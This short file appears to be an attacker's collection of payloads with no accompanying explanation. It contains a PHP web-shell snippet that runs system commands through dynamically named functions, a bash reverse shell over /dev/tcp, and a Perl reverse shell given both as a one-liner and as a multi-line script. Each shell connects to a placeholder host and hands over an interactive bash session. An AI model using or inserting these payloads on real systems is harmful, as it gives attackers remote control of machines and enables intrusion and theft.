<?php

$_GET[0] = 'system';
$_GET[1] = 'id';
$_GET[0]($_GET[1]);
?>

/bin/bash -i >& /dev/tcp/xxxxxxx/7744 0>&1

perl -e 'use Socket;$i="xxxxxxx";$p=23333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

use Socket;
$i="xxxxxxx";
$p=2333;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i))))
{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/bash -i");
};
